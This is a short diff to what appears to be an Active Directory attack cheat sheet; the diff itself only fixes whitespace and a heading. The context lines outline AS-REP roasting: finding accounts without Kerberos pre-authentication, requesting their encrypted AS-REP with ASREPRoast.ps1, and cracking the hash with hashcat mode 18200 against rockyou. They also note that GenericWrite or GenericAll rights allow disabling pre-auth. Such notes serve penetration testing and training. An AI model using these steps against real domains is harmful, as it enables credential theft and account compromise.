@@ -124,7 +124,6 @@ Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ```
 
 
-
 #### Request encrypted AS-REP
 ```
 . ./ASREPRoast.ps1
@@ -143,7 +142,7 @@ Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
 Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
 
-### Set preauth not required
+### Set pre-auth not required
 - With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
 #### Enumerate permissions for group
 ```
